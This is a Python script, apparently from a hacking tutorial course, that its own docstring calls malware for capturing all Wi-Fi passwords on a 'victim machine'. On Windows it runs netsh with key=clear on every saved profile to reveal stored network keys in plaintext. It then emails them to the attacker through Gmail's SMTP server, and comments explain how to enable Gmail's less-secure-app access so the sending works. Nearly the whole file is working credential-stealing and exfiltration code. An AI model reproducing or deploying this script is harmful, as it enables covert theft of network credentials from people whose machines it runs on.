"""The program is to capture all wifi-passwords on victim machine and send it to your email id
Python3
Bajwa Tech Academy/Bajwa Academy
This Program is same as Malware_WiFiPasswordCapture_sendreport2 but with comments for explanation
Windows Environment
"""

import subprocess, smtplib, re #import inbuilt modules subprocess, smtplib, re


def email_send(email,password,message): #function to send email
    server=smtplib.SMTP("smtp.gmail.com",587) #create server instance of SMTP through smtplib inbuilt module
    #"smtp.gmail.com represent gmail server and gmail allows you to send email through it, it is running on port 587
    server.starttls() #start the server
    server.login(email,password) #login through your email id and pasword
    server.sendmail(email,email,message) #send email "from ur email(1st parameter)" to "your email(2nd parameter)"
    #3rd parameter is message which you send and it contains all wifi names and passwords you get by running command:
    #"netsh wlan show profile wifiname kry=clear"
    server.quit() #quitting the server
    #here in above function, one point to be noted that, you must have to enable "Allow Less secure apps"
    # oterwise you can't be able to send email through it because due to security reason gmail can't allow it by default.
    #to enable it open gmail, go to google accounts, go to security, then allow access to Less secure apps ON


command="netsh wlan show profile" # gives you details of all wifi accesspoints anytime connected on the machine
all_networks = subprocess.check_output(command,shell=True).decode("utf-8") #executing the command "netsh wlan show profile" refer by
# "command" variable by using inbuilt module "subprocess" function "check_output" which after executing the command also return its
# output which we store as object and referred by "all_networks variable.
#Here point to be noted that, we have to convert or decode the output in "utf-8" by using function decode otherwise give error
#that data is in bytes while you are using it in next line while using regular expression
only_network_names = re.findall("(?:Profile\s*:\s)(.*)", all_networks) #extracting only names of wifi accesspoint by
# using regular expression. for it we also import "re" inbuilt module and using its "findall" function. Here it finds all occurences of
#1st parameter which is regular expression used to identify only network names and leave out all other details from "all_networks"
#variable value
result="" # an empty strinng which contain our final result.

for network_name in only_network_names: #for loop. here we are executing netsh command for each wifi accesspoint name seperately
    # with key=clear to extract password of that wifi.
    final_network_name = network_name[0:-1] #important, To remove \r at the end of each name in the list
    command1 = f"netsh wlan show profile \"{str(final_network_name)}\" key=clear" #execute command
    print(command1)
    #"netsh wlan show profile wifiname(Referred by "final_network_name" variable) key=clear" command

    temp_result = subprocess.check_output(command1, shell=True).decode('utf-8') #store result for one wifi with each loop iteration
    result=result+str(temp_result) #store results of all loop iterations


email_send("youremail","password", result) #finally send the email having our results as message in 3rd parameter